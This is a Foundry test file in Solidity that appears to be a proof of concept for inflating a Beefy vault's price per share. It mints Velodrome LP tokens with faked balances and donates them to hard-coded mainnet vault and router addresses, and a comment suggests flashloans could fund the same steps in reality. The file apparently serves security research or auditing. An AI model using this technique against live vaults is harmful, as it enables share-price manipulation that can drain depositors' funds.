// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/Mock/MockNFT.sol";
import "../src/Mock/MockERC20.sol";

interface IRouter {
  function addLiquidity(
        address tokenA,
        address tokenB,
        bool stable,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external;
}

interface ILPPair {
    function tokens() external view returns (address, address);
}

interface IBeefyVault {
    function getPricePerFullShare() external view returns (uint256);
    function want() external view returns (IERC20);
}

contract CounterTest is Test {

    using stdStorage for StdStorage;
    StdStorage stdlib;

    function setUp() public {

    }

    function writeTokenBalance(address who, address token, uint256 amt) internal {
        stdlib.target(token).sig(IERC20(token).balanceOf.selector).with_key(who).checked_write(amt);
    }

    function testInflateBeefySharePrice() public {

        IRouter velodromeRouter = IRouter(0x9c12939390052919aF3155f41Bf4160Fd3666A6f);

        IBeefyVault vault = IBeefyVault(0x4a6F75A5A996F16D467e3452DC9ED4BFFcB4DD4b);

        IERC20 want = vault.want();

        ILPPair lpToken = ILPPair(address(want));

        address token0;
        address token1;

        (token0, token1) = lpToken.tokens();
        uint256 amountGiven = 1000000 ether;

        // airdrop toke0 and token1 to address(this)
        // in realtiy, the balance of token can be acquired via purchase or flashloan
        writeTokenBalance(address(this), token0, amountGiven);
        writeTokenBalance(address(this), token1, amountGiven);

        uint256 token0Balance = IERC20(token0).balanceOf(address(this));
        assertEq(token0Balance, amountGiven);

        uint256 token1Balance = IERC20(token1).balanceOf(address(this));
        assertEq(token1Balance, amountGiven);

        // approve token0 and token1 for velodrome router in prepartion for adding liquidity
        IERC20(token0).approve(address(velodromeRouter), amountGiven);
        IERC20(token1).approve(address(velodromeRouter), amountGiven);

        // add liquidity to mint LP
        uint256 lpBalanceBefore = IERC20(address(lpToken)).balanceOf(address(this));

        velodromeRouter.addLiquidity(
            token1, 
            token0,
            false, // stable
            amountGiven,
            amountGiven,
            0,
            0,
            address(this),
            block.timestamp
        );

        uint256 lpBalanceAfter = IERC20(address(lpToken)).balanceOf(address(this));

        uint256 lpMinted = lpBalanceAfter - lpBalanceBefore;
        console.log("lp minted", lpMinted);

        // donate the minted lp token to the beefy pool to inflated
        // to inflate the price per share

        console.log("price per share before inflation", vault.getPricePerFullShare());

        IERC20(address(lpToken)).transfer(address(vault), lpMinted);

        console.log("price per share after inflation", vault.getPricePerFullShare());

    }

}
